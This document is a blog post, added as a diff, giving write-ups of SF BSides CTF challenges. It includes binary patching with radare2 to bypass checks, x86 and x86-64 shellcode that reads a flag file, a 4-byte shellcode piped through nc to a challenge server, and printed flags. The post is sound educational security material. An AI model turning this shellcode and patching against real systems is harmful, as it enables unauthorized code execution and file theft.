@@ -1,0 +1,479 @@
+---
+layout: page
+title: SF BSides CTF Writeup
+excerpt: A quick writeup of San Francisco Bsides CTF
+tags:
+  - ctf
+  - infosec
+category: note
+---
+
+<section id="outline-container-org5d4ecb3" class="outline-2">
+<h2 id="org5d4ecb3">Conference</h2>
+<div class="outline-text-2" id="text-org5d4ecb3">
+<p>
+In my short life, I've seen security conferences move from <i>"hide the speed
+pipe"</i> to <i>"Information security professionals discuss changes in information
+assurance policy and cybersecurity"</i>.
+</p>
+
+<p>
+At no other hacker conference is it clearer than at BSides that the the racous
+parties and threats of e-violence have been replaced with the hushed tones and
+somber realities of securing actual computer networks. Bsides is still closer to
+hacking's eager and optimistic roots than to it's sober future, but the impact
+of shifting status and fabulous wealth of new infosec startups has perceptibly
+influenced it's culture already.
+</p>
+
+<p>
+Because of the conference's stature in the Bay Area, many of the intelligensia
+of the San Francisco haqr scene managed to make an appearance. Lots of drinks
+were handed out, door security was lax and the hallway track was alive.
+</p>
+</div>
+</section>
+<section id="outline-container-org46307ab" class="outline-2">
+<h2 id="org46307ab">Writeups</h2>
+<div class="outline-text-2" id="text-org46307ab">
+<p>
+I lost interest in the talks fairly quickly, but after a friend invited me to
+play the CTF and I was immediately impressed. The Bsides crew managed to avoid
+many of the lame challenge formats and structural deficits that have made other
+CTFs tiresome rather than competitive. The challenges were extremely diverse in
+their subjects and no one group (even 'professional' CTF teams) managed to
+secure an answer to every challenge.
+</p>
+
+<p>
+Me and my friend managed to do pretty well, we ended up finishing in the top 5% of
+participants with substantially smaller team than others. 
+</p>
+
+<p>
+Because so many of these challenges don't have their answers published by their
+XXXXXXXs after the event is settled, it's up to the community to put together
+'writeups' of the techniques employed in solving these. Here is a smattering of
+some challenges I've written for.
+</p>
+</div>
+
+
+<div id="outline-container-orgcc9c042" class="outline-3">
+<h3 id="orgcc9c042">NOP</h3>
+<div class="outline-text-3" id="text-orgcc9c042">
+<p>
+The <span class="verbatim">NOP</span> instruction is microcode for <span class="verbatim">xchg EAX, EAX</span>
+</p>
+</div>
+</div>
+<div id="outline-container-org4822a00" class="outline-3">
+<h3 id="org4822a00">easycap</h3>
+<div class="outline-text-3" id="text-org4822a00">
+<p>
+This challenge doesn't include the flag in a string because it's spread out over
+multiple packets. You can easily extract the flag by 'following' a TCP stream in
+your network packet capture software of choice.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgca9a070" class="outline-3">
+<h3 id="orgca9a070">easy</h3>
+<div class="outline-text-3" id="text-orgca9a070">
+<p>
+This challenge doesn't require you to perform any reverse engineering as the
+the flag is visible as a direct <span class="verbatim">.symstrtab</span> entry.
+</p>
+
+<pre class="example">
+zv@syszv &gt;&gt; strings easy-64 | grep -i flag
+FLAG:db2f62a36a018bce28e46d976e3f9864
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org3346132" class="outline-3">
+<h3 id="org3346132">Skipper</h3>
+<div class="outline-text-3" id="text-org3346132">
+<p>
+In this challenge I'm going to use one of the best disassemblers available
+today: <a href="http://radare.org/r/">radare</a> . It is both free and contains many facilities for modifying
+the binary in various ways (without plugins). (You could also solve this
+challenge with a debugger very easily)
+</p>
+
+<pre class="example">
+cp tmp/skipper64 /tmp/skipper64-backup # a backup in case you fubar the binary
+r2 /tmp/skipper64
+</pre>
+
+<p>
+Next, seek the read head to the <span class="verbatim">main</span> symbol and tap <code>V</code> key to bring yourself
+into disassembly.
+</p>
+
+<pre class="example">
+[0x004026d1]&gt; s main
+</pre>
+
+<pre class="example">
+    0x004026d1      push rbp                                                                                                                                                                                
+    0x004026d2      mov rbp, rsp                                                                                                                                                                            
+    0x004026d5      sub rsp, 0x420                                                                                                                                                                          
+    0x004026dc      mov dword [rbp - 0x414], edi                                                                                                                                                            
+    0x004026e2      mov qword [rbp - 0x420], rsi                                                                                                                                                            
+    0x004026e9      mov rax, qword fs:[0x28]                   ; [0x28:8]=0x3200 ; '('                                                                                                                      
+    0x004026f2      mov qword [rbp - 8], rax                                                                                                                                                                
+    0x004026f6      xor eax, eax                                                                                                                                                                            
+    0x004026f8      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x004026ff      mov rdi, rax                                                                                                                                                                            
+    0x00402702      call 0x400b3e                              ;[1]                                                                                                                                         
+    0x00402707      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x0040270e      mov rsi, rax                                                                                                                                                                            
+    0x00402711      mov edi, str.Computer_name:__s_n           ; "Computer name: %s." @ 0x402987                                                                                                            
+    0x00402716      mov eax, 0                                                                                                                                                                              
+    0x0040271b      call sym.imp.printf                        ;[2]                                                                                                                                         
+    0x00402720      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x00402727      mov esi, str.hax0rz__                      ; "hax0rz!~" @ 0x40299a                                                                                                                      
+    0x0040272c      mov rdi, rax                                                                                                                                                                            
+    0x0040272f      call sym.imp.strcmp                        ;[3]                                                                                                                                         
+    0x00402734      test eax, eax                                                                                                                                                                           
+┌─&lt; 0x00402736      je 0x40275b                                ;[4]                                                                                                                                         
+│   0x00402738      lea rax, [rbp - 0x410]                                                                                                                                                                  
+│   0x0040273f      mov rsi, rax                                                                                                                                                                            
+│   0x00402742      mov edi, str.Sorry ; "Sorry, your computer's name - %s - is not correct!." @ 0x4029a8                                                    
+│   0x00402747      mov eax, 0                                                                                                                                                                              
+│   0x0040274c      call sym.imp.printf                        ;[2]                                                                                                                                         
+│   0x00402751      mov edi, 9                                                                                                                                                                              
+│   0x00402756      call sym.imp.raise                         ;[5]                                                                                                                                         
+└─&gt; 0x0040275b      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x00402762      mov rdi, rax                                                                                                                                                                            
+    0x00402765      call 0x400c4a                              ;[6]                                                                                                                                         
+    0x0040276a      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x00402771      mov rsi, rax                                                                                                                                                                            
+    0x00402774      mov edi, str.OS_version:__s_n              ; "OS version: %s." @ 0x4029dc                                                                                                               
+    0x00402779      mov eax, 0                                                                                                                                                                              
+    0x0040277e      call sym.imp.printf                        ;[2]                                                                                                                                         
+    0x00402783      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x0040278a      mov esi, str.2.4.31                        ; "2.4.31" @ 0x4029ec                                                                                                                        
+    0x0040278f      mov rdi, rax                                                                                                                                                                            
+    0x00402792      call sym.imp.strcmp                        ;[3]                                                                                                                                         
+    0x00402797      test eax, eax                                                                                                                                                                           
+┌─&lt; 0x00402799      je 0x4027e3                                ;[7]                                                                                                                                         
+│   0x0040279b      lea rax, [rbp - 0x410]                                                                                                                                                                  
+│   0x004027a2      mov rsi, rax                                                                                                                                                                            
+│   0x004027a5      mov edi, str.Sorry__your_OS_version____s___is_not_supported__n
+</pre>
+
+<p>
+You can see here that several functions are being called and compared against
+builtin strings like <i>hax0r!~</i>. The context gives you an idea that it's checking
+the hostname, but let's be sure.
+</p>
+
+<pre class="example">
+[0x004026d1]&gt; s 0x400b3e
+[0x00400b67]&gt; pd 10 @ +64
+0x00400ba7      mov edi, 1
+0x00400bac      call sym.imp.exit
+0x00400bb1      mov ecx, 0
+0x00400bb6      mov edx, 0x40291f                          ; "-n"
+0x00400bbb      mov esi, str.uname                         ; "uname" @ 0x402922
+0x00400bc0      mov edi, str.uname                         ; "uname" @ 0x402922
+0x00400bc5      mov eax, 0
+0x00400bca      call sym.imp.execlp
+0x00400bcf      call sym.imp.__errno_location
+0x00400bd4      mov eax, dword [rax]
+</pre>
+
+<p>
+You can see it's calling <span class="verbatim">uname</span> here. Before you start changing your system's
+configuration to accommodate, first know it's not possible to set your hostname
+to this value.
+</p>
+
+<p>
+This means you are going to either have to use a debugger and manually change
+the <span class="verbatim">ZF</span>, <span class="verbatim">CF</span>, <span class="verbatim">OF</span> or other condition flags or patch up all of the <span class="verbatim">je</span>
+instructions.
+</p>
+
+<pre class="example">
+[0x00400b67]&gt; oo+ # This makes the binary writable
+[0x00400b67]&gt; wao jmp @ 0x00402736
+[0x00400b67]&gt; wao jmp @ 0x00402799
+...
+</pre>
+
+<p>
+After this, run the binary and get the flag! <code>FLAG:f51579e9ca38ba87d71539a9992887ff</code>
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-org52d1f54" class="outline-3">
+<h3 id="org52d1f54"><span class="todo TODO">TODO</span> Skipper2</h3>
+</div>
+
+<div id="outline-container-org729e4dd" class="outline-3">
+<h3 id="org729e4dd">Easyshell 1</h3>
+<div class="outline-text-3" id="text-org729e4dd">
+<p>
+Both of the easyshell puzzles are warmups who run any shellcode sent on the
+wire. However, you can't use some of the most common shellcode for spawning
+<span class="verbatim">/bin/sh</span> as there is no remote shell. This shellcode reads the file
+<span class="verbatim">/home/ctf/flag.txt</span>
+</p>
+
+<p>
+Compile with <code>nasm -f bin flag.asm</code>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-asm"><span style="color: #268bd2;">BITS</span> <span style="color: #859900; font-weight: bold;">32</span>
+<span style="color: #268bd2;">section</span> .text
+<span style="color: #268bd2;">_start</span>:
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%eax</span>, <span style="color: #268bd2;">%eax</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%ebx</span>, <span style="color: #268bd2;">%ebx</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%ecx</span>, <span style="color: #268bd2;">%ecx</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%edx</span>, <span style="color: #268bd2;">%edx</span>
+  <span style="color: #859900; font-weight: bold;">jmp</span> two
+
+<span style="color: #268bd2;">one</span>:
+  <span style="color: #859900; font-weight: bold;">pop</span> <span style="color: #268bd2;">%ebx</span>
+
+  <span style="color: #859900; font-weight: bold;">movb</span>  $5, <span style="color: #268bd2;">%al</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%ecx</span>, <span style="color: #268bd2;">%ecx</span>
+  <span style="color: #859900; font-weight: bold;">int</span> $0x80
+
+  <span style="color: #859900; font-weight: bold;">mov</span> <span style="color: #268bd2;">%eax</span>, <span style="color: #268bd2;">%esi</span>
+  <span style="color: #859900; font-weight: bold;">jmp</span> read
+
+<span style="color: #268bd2;">exit</span>:
+  <span style="color: #859900; font-weight: bold;">movb</span>  $1, <span style="color: #268bd2;">%al</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%ebx</span>, <span style="color: #268bd2;">%ebx</span>
+  <span style="color: #859900; font-weight: bold;">int</span> $0x80
+
+<span style="color: #268bd2;">read</span>:
+  <span style="color: #859900; font-weight: bold;">mov</span> <span style="color: #268bd2;">%esi</span>, <span style="color: #268bd2;">%ebx</span>
+  <span style="color: #859900; font-weight: bold;">movb</span>  $3, <span style="color: #268bd2;">%al</span>
+  <span style="color: #859900; font-weight: bold;">sub</span> $1, <span style="color: #268bd2;">%esp</span>
+  <span style="color: #859900; font-weight: bold;">lea</span> <span style="color: #2aa198;">(</span><span style="color: #268bd2;">%esp</span><span style="color: #2aa198;">)</span>, <span style="color: #268bd2;">%ecx</span>
+  <span style="color: #859900; font-weight: bold;">movb</span>  $1, <span style="color: #268bd2;">%dl</span>
+  <span style="color: #859900; font-weight: bold;">int</span> $0x80
+
+  <span style="color: #859900; font-weight: bold;">xor</span> <span style="color: #268bd2;">%ebx</span>, <span style="color: #268bd2;">%ebx</span>
+  <span style="color: #859900; font-weight: bold;">cmp</span> <span style="color: #268bd2;">%eax</span>, <span style="color: #268bd2;">%ebx</span>
+  <span style="color: #859900; font-weight: bold;">je</span>  exit
+
+  <span style="color: #859900; font-weight: bold;">movb</span>  $4, <span style="color: #268bd2;">%al</span>
+  <span style="color: #859900; font-weight: bold;">movb</span>  $1, <span style="color: #268bd2;">%bl</span>
+  <span style="color: #859900; font-weight: bold;">movb</span>  $1, <span style="color: #268bd2;">%dl</span>
+  <span style="color: #859900; font-weight: bold;">int</span> $0x80
+
+  <span style="color: #859900; font-weight: bold;">add</span> $1, <span style="color: #268bd2;">%esp</span>
+  <span style="color: #859900; font-weight: bold;">jmp</span> read
+
+<span style="color: #268bd2;">two</span>:
+  <span style="color: #859900; font-weight: bold;">call</span>  one
+  <span style="color: #859900; font-weight: bold;">.string</span> <span style="color: #2aa198;">"/home/ctf/flag.txt"</span>
+</pre>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org327bd9d" class="outline-3">
+<h3 id="org327bd9d">Easyshell 2</h3>
+<div class="outline-text-3" id="text-org327bd9d">
+<p>
+Like the prior challenge, you simply just need to write some code to read out
+a file. I used the following.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-asm"><span style="color: #268bd2;">BITS</span> <span style="color: #859900; font-weight: bold;">64</span>
+<span style="color: #268bd2;">section</span> .text
+<span style="color: #268bd2;">_start</span>:
+  <span style="color: #859900; font-weight: bold;">jmp</span> _push_filename
+
+<span style="color: #268bd2;">_readfile</span>:
+  <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">syscall open file</span>
+  <span style="color: #859900; font-weight: bold;">pop</span> rdi <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">pop path value</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> rax, rax
+  <span style="color: #859900; font-weight: bold;">add</span> al, 2
+  <span style="color: #859900; font-weight: bold;">xor</span> rsi, rsi <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">set O_RDONLY flag</span>
+  <span style="color: #859900; font-weight: bold;">syscall</span>
+
+  <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">syscall read file</span>
+  <span style="color: #859900; font-weight: bold;">sub</span> sp, 0xfff
+  <span style="color: #859900; font-weight: bold;">lea</span> rsi, <span style="color: #2aa198;">[</span>rsp<span style="color: #2aa198;">]</span>
+  <span style="color: #859900; font-weight: bold;">mov</span> rdi, rax
+  <span style="color: #859900; font-weight: bold;">xor</span> rdx, rdx
+  <span style="color: #859900; font-weight: bold;">mov</span> dx, 0xfff<span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">size to read</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> rax, rax
+  <span style="color: #859900; font-weight: bold;">syscall</span>
+
+  <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">syscall write to stdout</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> rdi, rdi
+  <span style="color: #859900; font-weight: bold;">add</span> dil, 1 <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">set stdout fd = 1</span>
+  <span style="color: #859900; font-weight: bold;">mov</span> rdx, rax
+  <span style="color: #859900; font-weight: bold;">xor</span> rax, rax
+  <span style="color: #859900; font-weight: bold;">add</span> al, 1
+  <span style="color: #859900; font-weight: bold;">syscall</span>
+
+  <span style="color: #93a1a1;">; </span><span style="color: #93a1a1;">syscall exit</span>
+  <span style="color: #859900; font-weight: bold;">xor</span> rax, rax
+  <span style="color: #859900; font-weight: bold;">add</span> al, 60
+  <span style="color: #859900; font-weight: bold;">syscall</span>
+
+<span style="color: #268bd2;">_push_filename</span>:
+  <span style="color: #859900; font-weight: bold;">call</span> _readfile
+  <span style="color: #859900; font-weight: bold;">path</span>: db <span style="color: #2aa198;">"/home/ctf/flag.txt"</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org7cd3671" class="outline-3">
+<h3 id="org7cd3671">i-am-the-shortest</h3>
+<div class="outline-text-3" id="text-org7cd3671">
+<p>
+This is a challenge designed to mimic the common constraints exploit authors must deal with.
+</p>
+
+<p>
+The premise of the challenge is that you get to execute 5 arbitrary bytes - far
+shorter than even the shortest shellcode could allow for.
+</p>
+
+<p>
+There's undoubtedly dozens of ways the problem can be solved, I've successfully used two:
+</p>
+</div>
+
+<div id="outline-container-org8b386a5" class="outline-4">
+<h4 id="org8b386a5">Direct System Call</h4>
+<div class="outline-text-4" id="text-org8b386a5">
+<p>
+Beginning at <span class="verbatim">0x80487ef</span>, the core code runs:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-asm"><span style="color: #268bd2;">call</span>   <span style="color: #859900; font-weight: bold;">80486db</span> &lt;get_flag&gt; <span style="color: #93a1a1;">;; </span><span style="color: #93a1a1;">where the 'flag' is gotten</span>
+<span style="color: #268bd2;">add</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0x10
+<span style="color: #268bd2;">lea</span>    <span style="color: #859900; font-weight: bold;">eax</span>,<span style="color: #2aa198;">[</span>ebp-0x8c<span style="color: #2aa198;">]</span>
+<span style="color: #268bd2;">mov</span>    <span style="color: #859900; font-weight: bold;">esi</span>,eax
+<span style="color: #268bd2;">mov</span>    <span style="color: #859900; font-weight: bold;">ebx</span>,0x1
+<span style="color: #268bd2;">sub</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0x8
+<span style="color: #268bd2;">lea</span>    <span style="color: #859900; font-weight: bold;">eax</span>,<span style="color: #2aa198;">[</span>ebp-0x8c<span style="color: #2aa198;">]</span>
+<span style="color: #268bd2;">push</span>   <span style="color: #859900; font-weight: bold;">eax</span>
+<span style="color: #268bd2;">push</span>   <span style="color: #859900; font-weight: bold;">0x8048946</span>
+<span style="color: #268bd2;">call</span>   <span style="color: #859900; font-weight: bold;">8048500</span> <a href="mailto:printf%40plt">&lt;printf@plt&gt;</a>
+<span style="color: #268bd2;">add</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0x10
+<span style="color: #268bd2;">sub</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0xc
+<span style="color: #268bd2;">push</span>   <span style="color: #859900; font-weight: bold;">0x8048964</span>
+<span style="color: #268bd2;">call</span>   <span style="color: #859900; font-weight: bold;">8048550</span> <a href="mailto:puts%40plt">&lt;puts@plt&gt;</a>
+<span style="color: #268bd2;">add</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0x10
+<span style="color: #268bd2;">sub</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0x4
+<span style="color: #268bd2;">push</span>   <span style="color: #859900; font-weight: bold;">0x5</span>
+<span style="color: #268bd2;">push</span>   <span style="color: #859900; font-weight: bold;">DWORD</span> PTR <span style="color: #2aa198;">[</span>ebp-0x94<span style="color: #2aa198;">]</span>
+<span style="color: #268bd2;">push</span>   <span style="color: #859900; font-weight: bold;">0x0</span>
+<span style="color: #268bd2;">call</span>   <span style="color: #859900; font-weight: bold;">80484f0</span> <a href="mailto:read%40plt">&lt;read@plt&gt;</a> <span style="color: #93a1a1;">;; </span><span style="color: #93a1a1;">where `read` is called</span>
+<span style="color: #268bd2;">add</span>    <span style="color: #859900; font-weight: bold;">esp</span>,0x10
+<span style="color: #268bd2;">mov</span>    <span style="color: #859900; font-weight: bold;">DWORD</span> PTR <span style="color: #2aa198;">[</span>ebp-0x90<span style="color: #2aa198;">]</span>,eax
+<span style="color: #268bd2;">mov</span>    <span style="color: #859900; font-weight: bold;">edx</span>,0xff
+<span style="color: #268bd2;">cmp</span>    <span style="color: #859900; font-weight: bold;">DWORD</span> PTR <span style="color: #2aa198;">[</span>ebp-0x90<span style="color: #2aa198;">]</span>,0x5
+<span style="color: #268bd2;">ja</span>     <span style="color: #859900; font-weight: bold;">804885c</span> &lt;main+0x10c&gt;
+<span style="color: #268bd2;">jmp</span>    <span style="color: #859900; font-weight: bold;">DWORD</span> PTR <span style="color: #2aa198;">[</span>ebp-0x94<span style="color: #2aa198;">]</span> <span style="color: #93a1a1;">;; </span><span style="color: #93a1a1;">here is where it finally jumps in</span>
+</pre>
+</div>
+
+<p>
+The last line is where this <span class="verbatim">jmp</span> to attacker-controlled memory actually
+occurs.
+</p>
+
+<p>
+Although the above code snippet doesn't show it directly, it's also important
+to note that the address of the flag read remains stored in <span class="verbatim">ESI</span> when the <code>jmp
+    [ebp-0x94]</code> occurs.
+</p>
+
+<p>
+In tandem with the fact that <span class="verbatim">read</span> returns the length of the value read in
+<span class="verbatim">EAX</span>, you can abuse this by entering a system-call. (Remember, Linux calling
+convention dictates that x86 system call's interrupt vector is given in <span class="verbatim">EAX</span>)
+</p>
+
+<p>
+So, in total you need to write shellcode that is only <b>4</b> bytes long (rather
+than the maximum permitted of 6), you can have the interrupt vector 'prefilled'
+for you. This leaves you with only two tasks:
+</p>
+
+<ul class="org-ul">
+<li>All you need to do now is find an efficient way to copy <span class="verbatim">ESI</span> into <span class="verbatim">ECX</span> (the source register for the <span class="verbatim">read</span> system call)</li>
+<li>Actually invoking a system call.</li>
+</ul>
+
+<p>
+There are a number of ways to do the above and due to the idiosyncracies of how
+assemblers are written and how opcodes are decoded, it's possible to write many
+different variations of an instruction that vary wildly in length. Anything
+that moves the contents of ESI into ECX will do.
+</p>
+
+<p>
+After this, you need to initiate a system call, you can use either <span class="verbatim">sysenter</span>
+or <span class="verbatim">int 0x80</span> as both are encoded in 2 bytes.
+</p>
+
+<p>
+All told, the following shellcode should do just fine.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-asm"><span style="color: #268bd2;">mov</span> <span style="color: #859900; font-weight: bold;">cx</span>, si
+<span style="color: #268bd2;">int</span> <span style="color: #859900; font-weight: bold;">0x80</span>
+</pre>
+</div>
+
+<p>
+I use and recommend <a href="http://www.nasm.us/">Netwide Assembler</a>, although there are other tools like
+<a href="https://github.com/radare/radare2/wiki/Ragg2">Ragg2</a>. To generate assembly without any sort of executable format, you can use
+the following argument switches to assemble and hexdump your shellcode:
+</p>
+
+<p>
+<code>nasm -f bin assembly.asm &amp;&amp; xxd assembly</code>
+</p>
+
+<p>
+After this, you can encode it in whichever format you'd like and send it off!
+</p>
+
+<pre class="example">
+[zv@syszv] /tmp &gt;&gt; echo -en '\x89\xf1\xcd\x80' | \
+                   nc i-am-the-shortest-6d15ba72.ctf.bsidessf.net 8890
+The address of 'flag' is 0xfff3bd5c
+Send your machine code now! Max length = 5 bytes.
+
+FLAG:c9f053110aa0f2d28ed8978e3b03cb01
+v7`v`v7`vyy`v`vp7x%
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgfc5d030" class="outline-4">
+<h4 id="orgfc5d030">Return-to-Libc</h4>
+<div class="outline-text-4" id="text-orgfc5d030">
+<p>
+This is a little trickier, you need to abuse at least two different tricks here.
+</p>
+</div>
+</div>
+</div>
+</section>
